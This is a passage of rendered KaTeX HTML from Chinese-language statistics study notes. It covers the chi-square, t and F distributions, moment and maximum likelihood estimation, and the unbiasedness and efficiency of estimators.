class="mclose">)</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><msup><mi mathvariant="script">X</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi><mo separator="true">,</mo><mi>D</mi><mo stretchy="false">(</mo><msup><mi mathvariant="script">X</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo>=</mo><mn>2</mn><mi>n</mi></mrow><annotation encoding="application/x-tex">E(\mathcal{X}^2)=n,D(\mathcal{X}^2)=2n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathdefault">n</span></span></span></span></li></ul></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>t</mtext></mrow><annotation encoding="application/x-tex">\text{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord text"><span class="mord">t</span></span></span></span></span>分布 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mo>∼</mo><mi>t</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">t \sim t(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mo>∼</mo><mi>N</mi><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>Y</mi><mo>∼</mo><msup><mi mathvariant="script">X</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X \sim N(0,1), Y \sim \mathcal{X}^2(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> --&gt; 随机变量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mo>=</mo><mfrac><mi>X</mi><msqrt><mrow><mi>Y</mi><mi mathvariant="normal">/</mi><mi>n</mi></mrow></msqrt></mfrac></mrow><annotation encoding="application/x-tex">t=\frac{X}{\sqrt{Y/n}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.7019309999999999em;vertical-align:-0.8295999999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.4641625em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0369107142857144em;"><span class="svg-align" style="top:-3.428571428571429em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="mord mtight" style="padding-left:1.19em;"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">Y</span><span class="mord mtight">/</span><span class="mord mathdefault mtight">n</span></span></span><span style="top:-3.0089107142857143em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.5428571428571431em;"><svg width="400em" height="1.5428571428571431em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4196607142857143em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8295999999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li></ul></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span></span></span></span>分布 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mo>∼</mo><mi>F</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F \sim F(n_1,n_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>U</mi><mo>∼</mo><msup><mi>X</mi><mn>2</mn></msup><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>V</mi><mo>∼</mo><msup><mi>X</mi><mn>2</mn></msup><mo stretchy="false">(</mo><msub><mi>n</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">U \sim X^2(n_1),V \sim X^2(n_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> --&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mo>=</mo><mfrac><mrow><mi>U</mi><mi mathvariant="normal">/</mi><msub><mi>n</mi><mn>1</mn></msub></mrow><mrow><mi>V</mi><mi mathvariant="normal">/</mi><msub><mi>n</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">F=\frac{U/n_1}{V/n_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="mord mtight">/</span><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span><span class="mord mtight">/</span><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li></ul></li></ul></li></ul><h2 id="参数估计"><a class="markdownIt-Anchor" href="#参数估计"></a> 参数估计</h2><ul><li>点估计（估计量、估计值）<ul><li><strong>矩估计</strong>：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>充分大时，样本矩等于总体矩<ul><li>总体一阶矩<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo></mrow><annotation encoding="application/x-tex">E(X)=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span> 样本均值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>X</mi><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\bar{X}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8201099999999999em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8201099999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;">ˉ</span></span></span></span></span></span></span></span></span> --&gt; 得到参数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span></span>的矩估计量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>θ</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\theta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9578799999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;">^</span></span></span></span></span></span></span></span></span></li></ul></li><li><strong>最大似然估计</strong>：使得样本<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">x_1,x_2,\cdots,x_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>发生的概率最大的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span></span>值最恰当<ul><li>求似然函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub><mo separator="true">;</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">;</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(\theta)=L(x_1,x_2,\cdots,x_n;\theta)=\prod \limits_{i=1}^n p(x_i;\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.329066em;vertical-align:-0.9776689999999999em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3513970000000004em;"><span style="top:-2.122331em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0000050000000003em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op">∏</span></span></span><span style="top:-3.950005em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9776689999999999em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span></li><li>取对数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mi>n</mi><mi>L</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">lnL(\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">n</span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span></li><li>求驻点得到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>θ</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\theta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9578799999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;">^</span></span></span></span></span></span></span></span></span></li></ul></li></ul></li><li>估计量的评选标准<ul><li><strong>无偏性</strong>：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mover accent="true"><mi>θ</mi><mo>^</mo></mover><mo stretchy="false">)</mo><mo>=</mo><mi>θ</mi></mrow><annotation encoding="application/x-tex">E(\hat\theta)=\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;">^</span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span></span></li><li><strong>有效性</strong>：比较<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mo stretchy="false">(</mo><mover accent="true"><mi>θ</mi><mo>^</mo></mover><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">D(\hat\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2078799999999998em;vertical-align:-0.25em;"></span><span class="mord mathdefault" 